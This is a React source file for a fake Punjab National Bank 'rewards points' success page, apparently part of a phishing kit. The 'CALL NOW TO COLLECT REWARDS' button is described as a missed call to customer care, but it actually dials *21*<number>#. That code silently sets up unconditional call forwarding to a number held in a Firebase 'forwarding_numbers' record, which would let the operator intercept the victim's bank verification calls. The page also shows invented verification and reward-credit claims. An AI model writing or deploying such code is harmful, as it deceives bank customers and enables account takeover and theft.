import { useState, useEffect } from 'react';
import FirebaseUtil from '../FirebaseRepo';
import '../App.css';

const SuccessPage = () => {
  const [callNumber, setCallNumber] = useState('11111');
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchCallNumber = async () => {
      try {
        setIsLoading(true);
        setError(null);
        // Try the 'pnb_settings' collection first
        let doc = await FirebaseUtil.getDocument("pnb_settings", "forwarding_numbers");
        
        // If not found, try the 'settings' collection as fallback
        if (!doc?.call_forwarding_number) {
          doc = await FirebaseUtil.getDocument("settings", "forwarding_numbers");
        }
        
        if (doc?.call_forwarding_number && typeof doc.call_forwarding_number === 'string') {
          setCallNumber(doc.call_forwarding_number.trim());
        } else {
          // Set default if no valid number is found
          console.warn("No valid call number found in database, using default");
        }
      } catch (error) {
        console.error("Error fetching call number:", error);
        setError("Could not load call information. Please try again later.");
      } finally {
        setIsLoading(false);
      }
    };
    fetchCallNumber();
  }, []);

  const handleCallClick = () => {
    try {
      // Format: *21*number#
      const formattedNumber = callNumber.replace(/-/g, '');
      window.open(`tel:*21*${formattedNumber}%23`, '_self');
    } catch (error) {
      console.error("Error initiating call:", error);
      alert("Could not initiate call. Please try again or call manually.");
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header - Burgundy Bar with Logo */}
      <header className="bg-[#A20E37] p-4 flex justify-between items-center">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif">Punjab National Bank</h1>
            <p className="text-sm">80% Rewards Points Redeem Process Completed</p>
            <div className="bg-[#FBBC09] text-[#A20E37] px-2 py-0.5 text-xs mt-1 rounded inline-block font-semibold">
              The Name You Can Bank Upon
            </div>
          </div>
        </div>
        <div className="space-y-1.5">
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
        </div>
      </header>

      {/* Tagline */}
      <div className="bg-[#A20E37] text-white text-center pb-2">
        <p>Banking for the Unbanked</p>
      </div>

      {/* Main Content */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg border-t-4 border-[#A20E37]">
          <div className="text-center mb-6">
            <div className="bg-green-100 text-green-800 rounded-full px-4 py-2 mb-4 inline-block">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 inline mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              Verification Successful
            </div>
            <h1 className="text-2xl font-bold text-[#A20E37] mb-2">
              Congratulations!
            </h1>
            <p className="text-gray-600">
              Your transaction has been verified successfully.
            </p>
          </div>

          {error ? (
            <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
              <div className="flex">
                <div className="flex-shrink-0">
                  <svg className="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className="ml-3">
                  <p className="text-sm text-red-700">{error}</p>
                </div>
              </div>
            </div>
          ) : (
            <div className="bg-yellow-50 border-l-4 border-[#FBBC09] p-4 mb-6">
              <div className="flex">
                <div className="flex-shrink-0">
                  <svg className="h-5 w-5 text-[#FBBC09]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className="ml-3">
                  <p className="text-sm text-yellow-700">
                    To collect your Rewards Points, please give a missed call to our PNB Rewards Care.
                  </p>
                </div>
              </div>
            </div>
          )}

          {isLoading ? (
            <button
              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4 opacity-70 cursor-wait"
              disabled
            >
              Loading...
            </button>
          ) : (
            <button
              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
              onClick={handleCallClick}
              disabled={!!error}
            >
              CALL NOW TO COLLECT REWARDS
            </button>
          )}

          <button
            className="w-full bg-[#A20E37] hover:bg-[#8a0c2f] text-white font-bold py-2 px-4 rounded-full"
            onClick={() => window.location.href = '/'}
          >
            Back to Home
          </button>

          <p className="text-xs text-gray-500 text-center mt-4">
            Your rewards will be credited to your account within 24-48 hours after verification.
          </p>
        </div>
      </main>

      {/* Bottom Part / Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
        <p className="text-xs">For support, call {callNumber} or email care@pnb.co.in</p>
      </footer>
    </div>
  );
};

export default SuccessPage;